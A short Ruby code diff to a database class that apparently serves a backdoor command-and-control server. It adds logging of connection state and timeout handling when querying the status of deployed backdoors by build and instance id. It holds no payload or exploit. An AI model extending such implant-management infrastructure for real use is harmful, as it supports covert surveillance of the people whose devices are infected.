@@ -74,9 +74,19 @@ class DB
     trace :info, "Disconnected from [#{@host}]"
   end
 
+  def connected=(value)
+    #TODO: set this variable accordingly in each method to detect when the db is down
+    #@available = value
+    if value == true then
+      trace :info, "DB is up and running"
+    else
+      trace :warn, "DB is now considered NOT available"
+    end
+
+  end
+
   def connected?
     # is the database available ?
-    #TODO: set this variable accordingly in each method to detect when the db is down
     return @available
   end
 
@@ -161,9 +171,18 @@ class DB
     return DB::UNKNOWN_BACKDOOR, 0 if not @available
 
     trace :debug, "Asking the status of [#{build_id}] to the db"
+
+    status = DB::UNKNOWN_BACKDOOR
+    bid = 0
     
     # ask the database the status of the backdoor
-    return @db.status_of(build_id, instance_id, subtype)
+    begin
+      status, bid = @db.status_of(build_id, instance_id, subtype)
+    rescue Timeout::Error
+      self.connected = false
+    end
+
+    return status, bid
   end
 
   def sync_for(bid, version, user, device, source, time)
